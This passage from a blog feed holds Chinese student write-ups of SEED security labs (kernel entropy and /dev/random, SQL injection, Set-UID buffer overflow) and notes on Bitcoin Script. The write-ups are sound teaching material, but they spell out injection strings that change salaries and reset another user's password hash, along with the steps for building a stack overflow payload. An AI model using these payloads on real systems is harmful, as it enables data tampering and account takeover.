<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150918073.png"></p>
<p>执行脚本即可得到正确的密钥如下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150918966.png"></p>
<h3 id="2-3-Task-3-测量内核的熵"><a href="#2-3-Task-3-测量内核的熵" class="headerlink" title="2.3 Task 3: 测量内核的熵"></a>2.3 Task 3: 测量内核的熵</h3><p>随机性使用熵来度量，这与信息论中熵的含义不同。在这里，熵仅仅意味着系统当前有多少bit 的随机数。你可以使用下面的命令找出在当前时刻内核的熵是多少。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150919407.png"></p>
<p>watch 可以周期性地执行一个程序。我们使用watch 运行上面的命令来监控熵的变化。下面的命令每0.1 秒就执行一次cat 程序。请执行上面的命令。在它运行时，移动你的鼠标，点击鼠标，输入什么东西，读取一个大文件，访问一个网站。哪些活动会显著地使熵变大？请在实验报告中描述你的发现。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150919176.png"></p>
<p>移动鼠标会发现，增长很慢，移动一次即可增长1</p>
<p>输入字符，输入一个字符熵增长1</p>
<p>阅读文件，这里阅读系统日志，发现利用less阅读一次熵增长</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150919436.png"></p>
<p>访问网站，熵并不会自动增长，其增长取决于鼠标的点击移动以及字符的输入。</p>
<h3 id="2-4-任务4-从-x2F-dev-x2F-random-中获取伪随机数"><a href="#2-4-任务4-从-x2F-dev-x2F-random-中获取伪随机数" class="headerlink" title="2.4 任务4: 从&#x2F;dev&#x2F;random 中获取伪随机数"></a>2.4 任务4: 从&#x2F;dev&#x2F;random 中获取伪随机数</h3><p>Linux 将从物理资源收集的随机数据存储到一个随机池中，然后使用两个设备将随机源转换为伪随机数。这两个设备是&#x2F;dev&#x2F;random 和&#x2F;dev&#x2F;urandom 。它们有不同的行为。&#x2F;dev&#x2F;random 设备是阻塞设备。即，每当该设备给出随机数时，随机池的熵将减小。当熵达到零时，&#x2F;dev&#x2F;random 将阻塞，直到获得足够的随机性为止。</p>
<p>让我们设计一个实验来观察&#x2F;dev&#x2F;random 设备的行为。我们将使用cat 命令持续从&#x2F;dev&#x2F;random 中读取伪随机数。我们将输出通过管道传递到hexdump 以便获得良好的输出。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150920697.png"></p>
<p>请运行上面的命令，同时使用watch 命令来监视熵。如果不移动鼠标，也不键入任何内容，将会发生什么。然后，随机移动鼠标，看看是否可以观察到任何差异。请描述并解释你观察到的现象。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150921781.png"></p>
<p>如上图所示，如果没有操作，间隔一到二分钟后，会自动生成一行随机数，如果随机移动鼠标生成新的一行随机数的时间间隔变小。</p>
<p>解释如下：</p>
<p>为了保证随机数的质量，&#x2F;dev&#x2F;random 只能返回熵池当前最大可用的随机二进制位，当请求超过这个值，就会阻塞，直到熵池中有足够的随机二进制位。而移动鼠标可以增加当前的熵，因而其生成新一行随机数的时间间隔变小。</p>
<p><strong>问题：</strong> 假设一个服务器使用&#x2F;dev&#x2F;random 与客户端生成随机会话密钥。请描述你将如何对这样的一个服务器发起拒绝服务（DoS）攻击。</p>
<p><strong>回答：</strong>不断向服务器发送请求使其生成返回熵池中最大可用随机二进制位，直至其阻塞。</p>
<h3 id="2-5-任务5-从-x2F-dev-x2F-urandom-获取随机数"><a href="#2-5-任务5-从-x2F-dev-x2F-urandom-获取随机数" class="headerlink" title="2.5 任务5: 从&#x2F;dev&#x2F;urandom 获取随机数"></a>2.5 任务5: 从&#x2F;dev&#x2F;urandom 获取随机数</h3><p>Linux 提供了另一种方式，可以通过&#x2F;dev&#x2F;urandom 设备访问随机池。&#x2F;dev&#x2F;random 和&#x2F;dev&#x2F;urandom都可以使用随机池中的数据生成伪随机数。当熵不足时，&#x2F;dev&#x2F;random 将会暂停，而&#x2F;dev&#x2F;urandom 会继续生成新的数。将随机池中的数据视作“种子”，我们可以使用种子想生成多少随机数就生成多少。</p>
<p>让我们来看看&#x2F;dev&#x2F;urandom 的行为。我们再次使用cat 从设备中获取伪随机数。请运行下面的命令，描述移动鼠标是否会影响结果。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150921810.png"></p>
<p>如上图所示，urandom会不断产生新的随机数，其产生速度很快且没有任何停顿，移动鼠标并不会影响结果。</p>
<p>让我们测量随机数的质量。我们可以使用一个名为ent 的工具，该工具已经安装在我们的虚拟机中。根据其手册所言：“ent 对存储在文件中的字节序列进行各种测试，并报告这些测试的结果。该程序对于评估加密和统计采样应用程序，压缩算法以及其他文件信息密度受关注的应用程序的伪随机数生成器很有用”。让我们首先从&#x2F;dev&#x2F;urandom 生成1 MB 的伪随机数，并将其保存在文件中。然后，在该文件上运行ent。请描述你的结果，并分析随机数的质量是否良好</p>
<p>运行结果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150922383.png"></p>
<p>分析随机数质量：</p>
<p>可以观察到其熵接近8比特，可以得知其信息很密集，随机性好。</p>
<p>数据字节的算数平均值接近于127.5，蒙特卡洛值接近Π，行相关系数接近于0，因此可以推断由urandom所产生的随机数的随机性较好。</p>
<p>修改实验手册中的代码片段来生成一个256 bit 的加密密钥。请编译并运行你的代码，输出这些数并将屏幕截图放在报告里。</p>
<p>修改代码如下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150922807.png"></p>
<p>运行结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150922485.png"></p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL injection Lab</title>
    <url>/2022/10/20/SQLinjection/</url>
    <content><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>SQL 注入是一种代码注入技术，利用 Web 应用程序和数据库服务器之间接口的漏洞。当用户的输入没有被 Web 应用程序正确检查就被发送到后端数据库服务器时，就会出现 SQL 注入漏洞。很多 Web 应用程序从用户处获取输入，并使用用户输入来构建 SQL 查询，以获得数据库中的数据信息。Web 应用程序也使用 SQL 查询在数据库中进行数据信息的存储。这些都是 Web 应用程序开发中的常见做法。如果没有仔细构造 SQL 查询，则可能会出现 SQL 注入漏洞。SQL 注入攻击是对 Web 应用程序最常见的攻击之一。</p>
<span id="more"></span>
<p>在本实验中，我们创建了一个易受 SQL 注入攻击的 Web 应用程序，它包含许多 Web 开发人员常犯的错误。实验的目标是找到利用 SQL 注入漏洞的方法，展示攻击所能造成的伤害，并掌握防御此类攻击的技术。本实验覆盖以下主题:</p>
<p>1. SQL 语句：SELECT 与 UPDATE</p>
<p>2. SQL 注入</p>
<p>3. 语句预处理</p>
<h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：熟悉-SQL-语句"><a href="#2-1-Task-1：熟悉-SQL-语句" class="headerlink" title="2.1 Task 1：熟悉 SQL 语句"></a>2.1 Task 1：熟悉 SQL 语句</h3><p>Task 1 的目标是通过使用提供的数据库来熟悉 SQL 命令。Web 应用程序所使用的数据存储在 MySQL数据库中，由 MySQL 容器托管。我们创建了一个名为 sqllab_users 的数据库，其中包含一个名为credential 的表。表中存储着每个员工的个人信息（例如 eid、password、salary、ssn 等）。本任务中，请通过操作数据库熟悉 SQL 查询语句。运行手册中所给出命令后，你需要使用一条 SQL 命令打印员工 Alice 的所有资料信息。请提供结果截图。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151934509.png"></p>
<p>如上图所示，使用语句select * from credential where Name&#x3D;’Alice’;即可得到并打印Alice的所有资料信息。</p>
<h3 id="2-2-Task-2：基于SELECT语句的SQL注入攻击"><a href="#2-2-Task-2：基于SELECT语句的SQL注入攻击" class="headerlink" title="2.2 Task 2：基于SELECT语句的SQL注入攻击"></a>2.2 Task 2：基于SELECT语句的SQL注入攻击</h3><p>攻击者通过 SQL 注入技术可以执行恶意 SQL 语句，即恶意负载。通过恶意的 SQL 语句，攻击者可以从数据库中窃取数据，甚至对数据库进行修改。我们的 Web 应用程序数据库含有 SQL 注入漏洞，模仿了开发人员的常犯错误。在登陆网站<a href="http://www.seed-server.com中进行/">www.seed-server.com中进行</a> SQL 注入攻击的练习，登录页面见图 1。Web 应用程序根据用户名和口令认证用户，所以只有知道自己口令的员工才能登录。作为攻击者，请在无法得知任何员工口令的前提下成功登录 Web 应用程序。</p>
<h4 id="Task-2-1-基于网页的-SQL-注入攻击"><a href="#Task-2-1-基于网页的-SQL-注入攻击" class="headerlink" title="Task 2.1 基于网页的 SQL 注入攻击"></a>Task 2.1 基于网页的 SQL 注入攻击</h4><p>你的任务是以管理员的身份从登录页面登录到 Web 应用程序，这样你就可以查看所有员工的信息。管理员的用户名是 admin，口令未知。请在用户名与口令输入框中输入能成功完成攻击的内容。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151935882.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151936746.png"></p>
<p>如上图所示，在用户名框输入以上内容，即可成功登入管理员界面。其原理如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151937038.png"></p>
<p>在输入如上内容后，数据库中执行了上图中所展示的命令，#作为注释符，其后面的内容便无需再验证，即可成功进入管理员页面。</p>
<h4 id="Task-2-2-基于命令行的-SQL-注入攻击"><a href="#Task-2-2-基于命令行的-SQL-注入攻击" class="headerlink" title="Task 2.2 基于命令行的 SQL 注入攻击"></a>Task 2.2 基于命令行的 SQL 注入攻击</h4><p>在不使用网页的情况下完成 Task 2.1 的目标。你可以使用命令行工具，如 curl，它可以发送 HTTP 请求。如需在 HTTP 请求中包含多个参数，需要把 URL 和参数用一对单引号括起来。否则，用于分隔参数的特殊字符 (如 &amp;) 会被 shell 曲解，造成命令歧义。以下给出向Web 应用程序发送带有两个参数（username 和 Password）的 HTTP GET 请求的示例。</p>
<p>首先我们尝试输入正确的的用户名和口令，可以得到如下所示的结果。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151937183.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151939901.png"></p>
<p>然后我们进行SQL注入攻击，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151940274.png"></p>
<p>我们可以观察到两次得到相同的结果，证明在命令行中SQL注入攻击实现成功。</p>
<h4 id="Task-2-3-增加一条新的-SQL-语句"><a href="#Task-2-3-增加一条新的-SQL-语句" class="headerlink" title="Task 2.3 增加一条新的 SQL 语句"></a>Task 2.3 增加一条新的 SQL 语句</h4><p>在 Task 2.1 与 Task 2.2 中，我们只能做到从数据库中窃取信息，进一步的攻击是通过登录页面上的相同漏洞对数据库的数据进行修改。请尝试在 SQL 注入攻击中使用两条SQL 语句，第二条是更新或删除语句。在 SQL 中，分号（;）被用来分隔两条 SQL 语句。请在登录页面使用两条 SQL 语句进行攻击。</p>
<p>首先在登录页面中进行尝试，得到如下报错：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151940588.png"></p>
<p>然后再命令行中进行尝试，同样得到报错如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151940111.png"></p>
<p>但是我们在数据库中直接运行以分号间隔的两条指令时，可以得到如下结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151940179.png"></p>
<p>发现并未产生报错，说明在数据库中是支持两条指令的执行的。根据报错，我们可以在网站的源码中找到如下代码：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151941931.png"></p>
<p>报错发生在query过程中，经过上网查询，可以得知，query函数执行针对数据库的某个查询，要实现多个语句的执行，需要将其修改为支持多个查询的multi_query函数，修改如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151941333.png"></p>
<p>重新在命令行中进行SQL注入攻击，可以得到如下结果，未发生报错，说明语句成功执行。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151941904.png"></p>
<h3 id="2-3-Task-3：基于UPDATE语句的SQL注入攻击"><a href="#2-3-Task-3：基于UPDATE语句的SQL注入攻击" class="headerlink" title="2.3 Task 3：基于UPDATE语句的SQL注入攻击"></a>2.3 Task 3：基于UPDATE语句的SQL注入攻击</h3><h4 id="Task-3-1-：修改自己的工资"><a href="#Task-3-1-：修改自己的工资" class="headerlink" title="Task 3.1 ：修改自己的工资"></a>Task 3.1 ：修改自己的工资</h4><p>编辑页面中只能修改员工的昵称、电子邮件、地址、电话号码和口令，而不能用于修改工资。假设你 (Alice) 由于老板 Boby 今年未给你加薪而感到不满。你想利用存在于编辑页面的SQL 注入漏洞来增加自己的工资。请展示你是如何实现这一目标的。已知列 salary 用于存储工资数额。首先我们使用Alice正确的用户名和口令进入自己的页面，可以得到如下结果：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151943088.png"></p>
<p>可以观察到其工资为20000，然后在编辑页面进行如下操作：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151943132.png"></p>
<p>修改后再观察自己的页面，可以发现攻击成功，工资变为99999</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151943791.png"></p>
<p>但是在数据库中，打印所有员工信息时，发现所有人的工资都被修改为了99999，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151944937.png"></p>
<p>这样的攻击容易被发现，通过研究发现，原因在于注释后没有限定语句，因而将所有人的工资都进行了修改，需要把原有的语句修改为</p>
<table>
<thead>
<tr>
<th>muyoo’,salary&#x3D;99999 where Name&#x3D;’Alice’; #</th>
</tr>
</thead>
</table>
<p>即可单独修改Alice的工资。</p>
<h4 id="Task-3-2：修改他人的工资"><a href="#Task-3-2：修改他人的工资" class="headerlink" title="Task 3.2：修改他人的工资"></a>Task 3.2：修改他人的工资</h4><p>在提高自己的工资数额后，你决定惩罚你的老板 Boby，将他的工资减少到1 美元。请展示你是如何实现这一目标的。</p>
<p>在Alice的编辑页面中NickName一项中输入如下指令：</p>
<table>
<thead>
<tr>
<th>‘,salary&#x3D;1 where Name&#x3D;’Boby’; #</th>
</tr>
</thead>
</table>
<p>即可成功修改Boby的工资，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151944484.png"></p>
<h4 id="Task-3-3：修改他人的口令"><a href="#Task-3-3：修改他人的口令" class="headerlink" title="Task 3.3：修改他人的口令"></a>Task 3.3：修改他人的口令</h4><p>修改完 Boby 的工资后，你仍心有不甘，所以你想修改 Boby 的口令，这样你就可以登录他的账户，做进一步的破坏。请展示你是如何实现这一目标的。你需要证明你可以用新的口令成功登录 Boby 的账户。需要注意，数据库存储的并非明文形式的口令，而是口令的哈希值。请在unsafe_edit_backend.php 中查看口令的存储方式，程序使用 SHA1 哈希函数来生成口令的哈希值。 由于在数据库中存储口令为sha1加密的，因而在Alice的编辑页面中NickName一项中输入如下指令：</p>
<table>
<thead>
<tr>
<th>‘,password&#x3D;sha1(‘123’) where Name&#x3D;’Boby’; #</th>
</tr>
</thead>
</table>
<p>即可成功修改Boby的口令为123</p>
<p>然后在登陆页面中输入用户名和口令即可成功进入Boby的主页，如下所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151944428.png"></p>
<h3 id="2-4-Task-4：对策：语句预处理"><a href="#2-4-Task-4：对策：语句预处理" class="headerlink" title="2.4 Task 4：对策：语句预处理"></a>2.4 Task 4：对策：语句预处理</h3><p>请使用语句预处理机制来修复 SQL 注入漏洞。为了简单起见，我们在文件夹 defense 内创建了一个简化程序，你需要对这个文件夹中的文件进行修改。访问下面给出的 URL，你会看到一个类似于 Web应用程序登录页面的网页，在网页中提供正确的用户名和口令即可查询员工的信息。</p>
<p>进入新的登录页面，利用SQL注入仍然可以成功登入页面，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151945671.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151945254.png"></p>
<p>根据实验手册中所给出指导对源码进行修改如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151945766.png"></p>
<p>重新在登录页面进行SQL注入攻击，发现登录进的页面不会显示个人信息：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151945667.png"></p>
<p>如果输入正确的用户名和口令，仍然可以会显示个人信息如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151946465.png"></p>
<p>证明防御措施的部署是成功的。</p>
<h3 id="2-5-思考题"><a href="#2-5-思考题" class="headerlink" title="2.5 思考题"></a>2.5 思考题</h3><p>假设数据库只存储 password 和 eid 两列的 SHA256 值。使用下面 SQL 语句与数据库交互，其中$passwd 和 $eid 变量的值由用户提供。这个程序是否存在 SQL 注入问题？如果没有，请解释原因；如果有，请给出构造范例。</p>
<p>答：仍然存在 SQL 注入问题。原因在于参数是可以拼接的， 可以在 eid 一项中输入如下内容： 008,256)’and 1&#x3D;1 # Passwd 中输入如下内容： 123,256)’and 1&#x3D;1 # 都可以成功实现 SQL 注入攻击</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>Scripts</title>
    <url>/2022/11/11/Scripts/</url>
    <content><![CDATA[<h1 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>比特币交易脚本语言    一种类似Forth（1960s的编程语言）的逆波兰表达式的基于堆栈的执行语句</p>
<span id="more"></span>
<h2 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h2><p>用该脚本语言编写在UTXO上的锁定脚本和解锁脚本         当一笔比特币交易被验证时，每一个输入值中的解锁脚本与其对应的锁定脚本同时执行，用以确定这笔交易是否满足支付条件          该语言被设计为在执行范围上有限制，类似于嵌入式装置。处于其安全特性用于验证可编程货币</p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><h3 id="1-图灵非完备性-turing-incompleteness"><a href="#1-图灵非完备性-turing-incompleteness" class="headerlink" title="1.图灵非完备性 turing incompleteness"></a>1.图灵非完备性 turing incompleteness</h3><p>scripts 有许多操作码，除了有条件的流控制以外，没有循环或复杂的流控制能力 确保了其图灵非完备性，脚本有限的复杂性和可预见的执行次数  </p>
<p>必要性：该限制确保了该语言不会被创造无限循环类似的逻辑炸弹，从而被攻击者植入在交易中，引起对于比特币网络的DOS攻击。防止交易验证机制被作为漏洞利用</p>
<h3 id="2-无状态验证"><a href="#2-无状态验证" class="headerlink" title="2.无状态验证"></a>2.无状态验证</h3><p>比特币脚本语言是无状态的，脚本在执行前后不会被保存。因此执行脚本的所有信息都包含在脚本中，因而脚本在任何系统上的执行方式都是相同的。一个人验证了脚本，就可以确保在比特币网络中的所有其他系统也验证了这个脚本，因此一个有效的交易对于所有人都是有效的。这种对于结果的可预见性保障了比特币系统的良好性质。</p>
<h2 id="脚本构建"><a href="#脚本构建" class="headerlink" title="脚本构建"></a>脚本构建</h2><p>比特币交易引擎依赖于两种脚本进行验证交易</p>
<p>锁定脚本：放置在输出上的花费条件——指定了今后花费这笔输出必须要满足的条件。   锁定脚本也被叫做 scriptPubKey，因为它其中包含一个公钥或者是比特币地址。</p>
<p>解锁脚本：一个解决或者是满足被锁定脚本在一个输出上所设定的花费条件的脚本，它将允许输出被消费。是每一笔比特币交易输入的一部分，包含由用户输入的私钥生成的数字签名 ScriptSig </p>
<p>验证过程：每一个比特币验证节点通过同时执行以上两个脚本来验证一笔交易     每个输入包含一个解锁脚本并且指向先前存在的UTXO。验证软件将会复制解锁脚本，检索输入所用的UTXO并且从这个UTXO上复制锁定脚本。然后依次执行解锁脚本和锁定脚本，若满足条件，则输入是有效的。 UTXO永久记录在区块链中，只有满足输出条件的有效交易才可以将其是做花费用掉并且从 UTXO set中删除。</p>
<p><img src="C:\Users\19577\AppData\Roaming\Typora\typora-user-images\image-20221109151633839.png" alt="image-20221109151633839"></p>
<h2 id="脚本执行栈"><a href="#脚本执行栈" class="headerlink" title="脚本执行栈"></a>脚本执行栈</h2><p>比特币脚本语言使用了栈这种数据结构。</p>
<p>脚本语言通过从左到右处理每一个项目来执行脚本    数据被压入栈中，操作码从栈中取出一个或者多个参数，运算他们之后可能将结果再压入栈中。</p>
<p>条件操作码：对条件进行判断，产生一个布尔结果。</p>
<h2 id="简单的脚本"><a href="#简单的脚本" class="headerlink" title="简单的脚本"></a>简单的脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2 3 OP_ADD 5 OP_EQUAL   <span class="literal">true</span> </span><br></pre></td></tr></table></figure>
<p>计算2+3的和并且判断其是否等于5</p>
<p>输入解锁脚本即为 2   锁定脚本为3 OP_ADD 5 OP_EQUAL 代入可得正确解</p>
<h2 id="分开执行解锁脚本和锁定脚本"><a href="#分开执行解锁脚本和锁定脚本" class="headerlink" title="分开执行解锁脚本和锁定脚本"></a>分开执行解锁脚本和锁定脚本</h2><p>2010发现存在允许异常解锁脚本推送数据入栈并且污染锁定脚本的漏洞。当前版本两个脚本随着栈的传递分开执行  首先执行解锁脚本，在执行过程中没有报错，在主函数栈中复制并执行锁定脚本，判断结果是否为true</p>
<p>锁定脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OP_DUP OP_HASH160 &lt;Cafe Public Key Hash&gt; OP_EQUALVERIFY OP_CHECKSIG</span><br></pre></td></tr></table></figure>
<p>解锁脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Cafe Signature&gt; &lt;Cafe Public Key&gt;</span><br></pre></td></tr></table></figure>


<p>组合后的验证脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Cafe Signature&gt; &lt;Cafe Public Key&gt; OP_DUP OP_HASH160 &lt;Cafe Public Key Hash&gt; OP_EQUALVERIFY OP_CHECKSIG</span><br></pre></td></tr></table></figure>














]]></content>
  </entry>
  <entry>
    <title>Buffer Overflow Attack Lab (Set-UID Version)</title>
    <url>/2022/11/30/buffer_overflow/</url>
    <content><![CDATA[<h1 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h1><p>缓冲区溢出定义为程序试图将数据写入缓冲区边界之外的情况。这一漏洞可以被恶意用户利用来改变程序的控制流，从而执行恶意代码。本实验的目的是让学生深入了解此类漏洞，并学习如何在攻击中利用此类漏洞。</p>
<span id="more"></span>
<p>在本实验中，学生将获得一个具有缓冲区溢出漏洞的程序；他们的任务是开发一种利用漏洞的方案并最终获得 root 权限。除了攻击之外，还将引导学生通过操作系统中已实施的几个保护机制来抵御缓冲区溢出攻击。学生需要评估这些机制是否有效并解释原因。本实验涵盖以下主题:</p>
<ol>
<li>缓冲区溢出漏洞与攻击</li>
<li>堆栈布局</li>
<li>地址随机化，不可执行栈以及 StackGuard</li>
<li>Shellcode (32-bit and 64-bit)</li>
<li>return-to-libc 攻击，旨在绕过不可执行栈的防御措施，相关内容会在另一个单独的实验中被覆盖</li>
</ol>
<h1 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h1><h2 id="Task-1：熟悉-Shellcode"><a href="#Task-1：熟悉-Shellcode" class="headerlink" title="Task 1：熟悉 Shellcode"></a>Task 1：熟悉 Shellcode</h2><p>给出了两个 shellcode 的副本，一个是 32-bit 另一个是 64-bit。当我们使用- m32 选项编译程序时，将使用 32-bit 的版本；如果没有-m32 选项，将使用 64-bit的版本。根据提供的 Makefile 文件，你可以通过输入 make 命令来编译程序。这样将会生成两个二进制文件：a32.out (32-bit) 和 a64.out(64-bit)。运行它们并描述你的观察结果。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130212823.png"></p>
<p>如上图所示，可以分别得到两个超级用户权限的shell窗口</p>
<h2 id="Task-2：理解漏洞程序"><a href="#Task-2：理解漏洞程序" class="headerlink" title="Task 2：理解漏洞程序"></a>Task 2：理解漏洞程序</h2><p>所给出程序存在缓冲区溢出漏洞。它首先从 badfile 文件中读取一个输入，然后将该输入传递给函数 bof() 中的另一个缓冲区。原始输入的最大长度可以为 517 字节，但是 bof() 中的缓冲区只有BUF_SIZE(100) 字节长，小于 517 字节。因为函数 strcpy() 不检查边界，所以会发生缓冲区溢出。由于此程序是一个以 root 为所有者的 Set-UID 程序，如果普通用户可以利用该缓冲区溢出漏洞，普通用户可能会获得 root shell。需要注意的是，该程序从 badfile 文件中获取输入，这个文件受用户控制。现在我们的目标是为 badfile 文件创建内容，这样当漏洞程序将内容复制到其缓冲区时，就可以获得 root shell。编译结果如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213005.png"></p>
<h2 id="Task-3-：对-32-bit-程序实施攻击-Level1）"><a href="#Task-3-：对-32-bit-程序实施攻击-Level1）" class="headerlink" title="Task 3 ：对 32 bit 程序实施攻击 (Level1）"></a>Task 3 ：对 32 bit 程序实施攻击 (Level1）</h2><p>为了利用目标程序中的缓冲区溢出漏洞，我们需要构造一个payload ，并将其保存在 badfile 文件 中。我们将使用一个 python 程序来做到这一点。在 Labsetup 文件夹中，我们提供了 exploit.py 程序 框架。代码不完整，学生需要替换代码中的一些基本值。 补全值如下图 所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213234.png"></p>
<p>运行结果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213318.png"></p>
<p>解释说明：</p>
<ul>
<li><p>Shellcode 填写：</p>
<p>由于该程序为 32bit，且在task1 中已经给出了 32bit 的 shellcode 编码，只需要将其补充到python 文件中即可。</p>
</li>
<li><p>Start 填写：</p>
<p>将恶意代码置于buffer 的尾部，可以在填充NOP 指令后，更方便的跳转到恶意代码，降低攻击难度。</p>
</li>
<li><p>Ret（返回地址）填写：</p>
<p>如图，该图即为在调用 strcpy 函数 时，栈中的具体情况，用来确定 offset 和返回地址 ret</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213506.png"></p>
<p>由于关闭了地址随机化，所以在gdb 调试时所得到的地址与运行时相同，通过 gdb 调试，可以在bof 函数的逐步调试过程中，得到上一个调用函数的ebp 的值所在的地址，如下图所示，为 0xffffd148</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213628.png"></p>
<p>然后根据栈在调用函数时候的结构如上图，可以知道，在该帧指针上方即为bof函数的返回地址，又因为程序为 32bit，因而需要对该地址进行 8 位的偏移，即可得到 bof 函数的返回地址为：0xffffd148+8。</p>
<ul>
<li><p>Offset 填写（64bit 程序同理）：</p>
<p>在gdb 中调试bof 函数时，可以通过disas 指令得到bof 函数的具体执行步骤，在其中找到call strcpy@plt 一行，加入断点，在重新调试程序，执行到该断点时，函数栈中ebp 仍指向上一个函数的ebp，而在其下面存放的是 bof 函数中所定义的局部变量buffer，因此，我们只需要取到ebp（rbp -64bit）的地址，以及 buffer 的地址，将其做差得到如下结果：</p>
<p>bof 函数的具体执行步骤，如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213724.png"></p>
<p>在调用strcpy 函数时加入断点：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213804.png"></p>
<p>计算offset：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130213846.png"></p>
<p>根据在计算ret 时所绘制的函数栈情况，可以看到返回地址所放置的位置应该在该差值上继续向上偏移 4 位（64bit 程序中偏移 8 位），因而为 112。</p>
</li>
</ul>
